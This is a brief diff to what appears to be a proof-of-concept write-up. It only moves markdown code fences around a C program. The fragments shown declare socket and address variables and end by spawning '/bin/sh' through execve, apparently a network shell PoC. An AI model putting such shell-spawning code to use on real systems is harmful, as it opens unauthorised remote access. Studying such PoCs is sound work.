@@ -9,7 +9,9 @@ Instructions:
 
 PoC:
 ----
-```int main(void){
+
+```
+int main(void){
 	int fd, newfd;
 	struct sockaddr_in server_addr, client_addr;
 
@@ -38,4 +40,5 @@ PoC:
 	execve("/bin/sh", NULL, NULL);
 	
 	return 0;
-}```
+}
+```
